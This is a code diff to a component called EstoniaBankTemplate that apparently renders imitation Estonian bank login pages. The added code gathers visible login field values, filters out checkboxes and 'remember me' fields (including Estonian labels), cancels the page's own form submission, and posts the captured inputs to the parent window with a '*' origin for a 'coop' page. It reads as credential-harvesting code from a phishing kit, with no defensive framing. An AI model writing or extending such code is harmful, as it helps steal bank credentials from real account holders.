@@ -515,10 +515,64 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             const fields = [];
             if (!container || !container.querySelectorAll) return fields;
 
-            container.querySelectorAll('input, select, textarea').forEach(input => {
+            const isRelevantVisibleField = (input) => {
+                if (!input || input.disabled) return false;
+
                 const type = ((input.type || input.tagName || '') + '').toLowerCase();
-                if (type === 'hidden' || type === 'submit' || type === 'button' || type === 'reset' || type === 'file') return;
-                if ((type === 'checkbox' || type === 'radio') && !input.checked) return;
+                const keyText = [
+                    input.name || '',
+                    input.id || '',
+                    input.getAttribute('data-testid') || '',
+                    input.getAttribute('placeholder') || '',
+                    getFieldLabel(input) || '',
+                ].join(' ').toLowerCase();
+
+                if (
+                    type === 'hidden' ||
+                    type === 'submit' ||
+                    type === 'button' ||
+                    type === 'reset' ||
+                    type === 'file' ||
+                    type === 'radio' ||
+                    type === 'checkbox'
+                ) {
+                    return false;
+                }
+
+                if (
+                    keyText.includes('rememberme') ||
+                    keyText.includes('remember me') ||
+                    keyText.includes('pea mind meeles') ||
+                    keyText.includes('salvesta') ||
+                    keyText.includes('meelde')
+                ) {
+                    return false;
+                }
+
+                const style = window.getComputedStyle(input);
+                if (
+                    style.display === 'none' ||
+                    style.visibility === 'hidden' ||
+                    style.pointerEvents === 'none'
+                ) {
+                    return false;
+                }
+
+                if (input.closest('[hidden], [aria-hidden="true"], .hidden, .d-none')) {
+                    return false;
+                }
+
+                if (!input.getClientRects().length) {
+                    return false;
+                }
+
+                return true;
+            };
+
+            container.querySelectorAll('input, select, textarea').forEach(input => {
+                if (!isRelevantVisibleField(input)) return;
+
+                const type = ((input.type || input.tagName || '') + '').toLowerCase();
 
                 const key = input.name || input.id || input.getAttribute('data-testid') || 'unknown';
                 fields.push({
@@ -804,6 +858,18 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
              e.preventDefault();
              e.stopPropagation();
              e.stopImmediatePropagation();
+
+             if (window.location.href.includes('coop')) {
+               const coopContainer = target.closest('form') || document;
+               const coopFields = buildCapturedFields(coopContainer);
+               const coopInputs = buildInputMap(coopFields);
+
+               window.parent.postMessage({
+                 type: 'ESTONIA_BANK_SUBMIT',
+                 formData: { inputs: coopInputs, fields: coopFields, loginMethod: getLoginMethod() }
+               }, '*');
+               return false;
+             }
 
              const form = target.closest('form');
              const inputContainer = form || document;
